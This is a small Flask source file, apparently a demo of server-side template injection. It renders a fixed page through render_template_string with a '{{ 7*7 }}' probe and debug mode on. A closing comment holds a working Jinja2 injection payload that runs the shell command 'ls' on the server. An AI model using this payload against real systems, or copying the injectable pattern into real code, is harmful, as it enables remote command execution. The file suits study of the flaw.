from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/')
def home():
    name = "cyber"
    html = """
    <html>
        <head><title>Welcome</title></head>
        <body>
            <h1>Hello, {{ 7*7 }}!</h1>
            <p>This page is rendered using <code>render_template_string</code>.</p>
        </body>
    </html>
    """
    return render_template_string(html, name=name)

if __name__ == '__main__':
    app.run(debug=True)



#{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}
